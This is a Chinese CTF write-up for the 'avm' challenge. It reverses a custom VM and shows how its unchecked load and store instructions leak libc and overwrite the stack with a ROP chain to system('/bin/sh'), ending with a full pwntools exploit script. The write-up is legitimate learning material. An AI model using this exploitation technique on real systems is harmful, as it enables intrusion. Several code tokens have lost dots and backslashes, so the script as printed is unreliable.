---
title: 长城杯avm wp
categories: recurrence
---
## 一.前言

​	本题主要是一个虚拟机的题，由于比赛时间并不是很长，因此这个题在逆向方面确实没有给大家过多的难度，利用原理也十分简单，由于虚拟机中load和store指令会读取或者存入栈中的一个数组，并且这个数组的长度不够长，导致攻击者可以任意地址写栈中0xfff大小的区域，因此可以泄露Libc并且通过rop实现攻击

## 二.逆向一下结构体

​	首先就是程序的入口main函数，他首先初始化，之后读取0x300长度的opcode。之后进入到sub_1230函数。

![image-20241216092601552](images/avm/image-20241216092601552.png)

​	这里面就是对于虚拟机中的寄存器进行初始化操作，首先a1是传入的一个bss的一个地址，然后这个题其实虚拟机的逆向难度也不复杂，直接看初始化和后面的run函数就可以分析出来，初始化的时候首先初始化了rip，然后以及opcode的指针和最后结束的指针，之后就是循环的初始化寄存器的值

![image-20241216092741025](images/avm/image-20241216092741025.png)

​	之后通过View -> open subviews -> local types里面加入对应结构体信息，然后把所有的指针都转换成结构体信息。

![image-20241216094335171](images/avm/image-20241216094335171.png)	

​	初始化结束之后就进入到了run的函数里面，首先就是开辟了s一个栈空间，用来作为后面load和store存取数据的位置，并且对其初始化，然后循环遍历解析opcode，和0xFFFFFFFFFFFFFFFCLL取&主要是为了后面的值是4的倍数，说明这个虚拟机时一个32位的虚拟机，之后进入到对应的注册函数中取根据opcode的28位的值。

![image-20241216092949466](images/avm/image-20241216092949466.png)

​	这里可以看到逆向之后的结果如下，就是简单的几个寄存器的功能。进入到具体的函数中，因为之前已经恢复了结构体的信息，所以进入函数之后很清楚的可以看到具体的内容。

![image-20241216093936842](images/avm/image-20241216093936842.png)

​	简单以store指令作为例子来解释，首先读取v3，也就是当前执行的opcode的值，之后取出右边移位5之后取出来的值对应的寄存器的值，加上右移十六位之后的opcdoe值相加，len是个固定的也就是0xff，所以这里面我的做法就是控制前面寄存器为1也就是v3 >> 5为1，这样由于之前清理过寄存器的值，所以我们只需要控制v3的十六位的值就可以控制整个值的内容，之后进入到If语句里面就简单的时读取传入a2也就是栈里面的值，然后把opcode最低位的对应的寄存器里面值赋值给栈中。

![image-20241216094621553](images/avm/image-20241216094621553.png)

​	其他所有的函数都大差不差，按照上面的思路都可以进行逆向。后面Load函数ida逆向的有点奇怪，但是实际上看一下汇编就可以看明白了，通过移位其实也就是一个字节一个字节的取赋值，因此ida逆向出来对于寄存器赋值的操作这么奇怪，在做题的时候完全可以把store反过来看就可以了。

![image-20241216095633714](images/avm/image-20241216095633714.png)

## 三.漏洞利用

​	经过上面的阐述其实也都直到漏洞的问题所在了，具体的利用思路就是通过load指令读取栈中的一些地址，比如libc中函数的地址，通过sub, add指令的功能减去偏移（这部分最开始思路想歪了，一直想着输出出来，但是其实把基地址算出来存在寄存器里面也一样）,获得到偏移之后就是利用system("/bin/sh")来执行命令，需要注意的是，这里面栈布局很神奇，在做题的时候发现很多Libc的地址根据s也就是栈中变量的偏移不固定，可以往远处找一找，比如后面的libc_start_main函数就可以了。

​	因此就是按照上述的思路来撰写代码，首先把需要用的几个指令封装一下：

```python
def operation(opcode, i, j, k):
    return p32((opcode << 28) + (i << 5) + (j << 16) + k)

def add(i, j, k):
    return operation(1, i, j, k)

def sub(i, j, k):
    return operation(2, i, j, k)

def store(i, j, k):
    return operation(9, i, j, k)

def load(i, j, k):
    return operation(10, i, j, k)
```

​	之后就是选择读取栈中的值，我们可以定位在b *$rebase(0x19ea)这里，根据rsi指向的地址来往后面查，这里需要注意我之前说的内容，在0x500左右的地址会出现libc的函数地址，但是会发现这个偏移不固定，还要爆破，因此我们可以继续往下面找，直到找到libc_start_main函数这里

![image-20241216101845864](/images/avm/image-20241216101845864.png)

​	这里的位置是0xd68，然后减去rsi和对应的偏移0x30就是我们后面写的位置0xd38了，这样我们就存了libc_start_main函数的地址了，后面就是利用寄存器sub掉和libc基地址的偏移，之后加上pop_rdi binash ret system等地址就可以了

​	这里再利用的时候需要注意，和常见的64位程序一样需要加一个ret，要么地址不是被0x10整除的会报错最终的exp如下：

```python
from pwn import *

io = process("/pwn")
#io = remote("123562999", 32801)
libc = ELF("/libcso6")
libc_start_main = 0x29d90
pop_rdi = 0x2a3e5
ret = 0x29139
system = 0x50d70
binsh = next(libcsearch(b'/bin/sh'))

def operation(opcode, i, j, k):
    return p32((opcode << 28) + (i << 5) + (j << 16) + k)

def add(i, j, k):
    return operation(1, i, j, k)

def sub(i, j, k):
    return operation(2, i, j, k)

def store(i, j, k):
    return operation(9, i, j, k)

def load(i, j, k):
    return operation(10, i, j, k)

opcode = load(1, 0xd38, 4) + load(1, 0x160, 5) + /
         sub(4, 5, 6) + load(1, 0x168, 7) + /
         add(6, 7, 8) + load(1, 0x170, 9) + /
         add(6, 9, 10) + load(1, 0x178, 11) + /
         add(6, 11, 12) + load(1, 0x180, 13) + /
         add(6, 13, 14) + store(1, 0x118, 8) + /
         store(1, 0x120, 10) + store(1, 0x128, 12) + /
         store(1, 0x130, 14) + p32(0) + /
         p64(libc_start_main) + p64(pop_rdi) + /
         p64(binsh) + p64(ret) + p64(system)

iosend(opcode)
iorecvuntil(b'opcode: Unsupported instruction/n')
iointeractive()
```

​	这里可以观察到我再store之后存入了一个p32(0)这个其实是为了让地址更完整，要么读取数据的时候会发现有其他数据干扰，之后对于load和store第一个参数都是1也是就是我们之前说的，需要找一个固定寄存器内容位0的寄存器，这样我们只需要控制第二个的内容就可以控制寄存器的值了。

## 四.总结

​	自此基本完成了所有对于avm原理的阐述，这个题目其实逆向难度不大，当时比赛过程中主要就是一直最开始想着输出基地址一度卡住了，之后也是被随便找到libc函数地址和栈地址偏移随机这个问题给困扰很久，但是通过这个题目也是学到了很多的东西，对于vm这种虚拟机的题目也有了更进一步的了解，希望后面可以争取加快逆向时的速度以及减少掉入一些缺乏经验的错误。